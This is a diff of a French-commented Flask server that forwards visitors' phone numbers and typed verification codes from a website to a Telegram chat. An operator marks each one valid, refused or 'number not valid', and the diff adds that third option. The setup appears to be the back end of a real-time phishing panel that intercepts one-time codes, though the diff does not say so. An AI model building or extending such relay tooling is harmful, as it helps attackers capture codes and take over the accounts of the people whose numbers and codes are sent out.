@@ -14,7 +14,7 @@ app = Flask(__name__)
 CORS(app)  # autorise ton site à appeler ce serveur
 
 # Demandes en attente de ta décision, gardées en mémoire.
-# id -> {"statut": "en_attente" | "valide" | "refuse", "t": horodatage}
+# id -> {"statut": "en_attente" | "valide" | "refuse" | "num_invalide", "t": horodatage}
 demandes = {}
 compteur = 0
 verrou = threading.Lock()
@@ -75,10 +75,15 @@ def verifier():
         f"*telephone* : {telephone}\n"
         f"*code tapé* : `{code}`"
     )
-    boutons = [[
-        {"text": "✅ Valider", "callback_data": f"ok:{rid}"},
-        {"text": "❌ Refuser", "callback_data": f"no:{rid}"},
-    ]]
+    boutons = [
+        [
+            {"text": "✅ Valider", "callback_data": f"ok:{rid}"},
+            {"text": "❌ Refuser", "callback_data": f"no:{rid}"},
+        ],
+        [
+            {"text": "📵 Numéro pas valide", "callback_data": f"num:{rid}"},
+        ],
+    ]
     envoyer(texte, boutons)
     return jsonify({"ok": True, "id": rid})
 
@@ -121,16 +126,17 @@ def poller():
                 if ":" not in data:
                     continue
                 action, rid = data.split(":", 1)
+                statuts = {"ok": "valide", "no": "refuse", "num": "num_invalide"}
                 with verrou:
-                    if rid in demandes:
-                        demandes[rid]["statut"] = "valide" if action == "ok" else "refuse"
+                    if rid in demandes and action in statuts:
+                        demandes[rid]["statut"] = statuts[action]
                         print(">>> demande", rid, "->", demandes[rid]["statut"], flush=True)
                     else:
                         print(">>> demande", rid, "inconnue de CE serveur", flush=True)
                 # Confirme le clic et met à jour le message
                 requests.post(f"{API}/answerCallbackQuery",
                               json={"callback_query_id": cb["id"], "text": "Enregistré"}, timeout=10)
-                deco = "✅ VALIDÉ" if action == "ok" else "❌ REFUSÉ"
+                deco = {"ok": "✅ VALIDÉ", "no": "❌ REFUSÉ", "num": "📵 NUMÉRO INVALIDE"}.get(action, "")
                 msg = cb["message"]
                 requests.post(f"{API}/editMessageText", json={
                     "chat_id": msg["chat"]["id"],
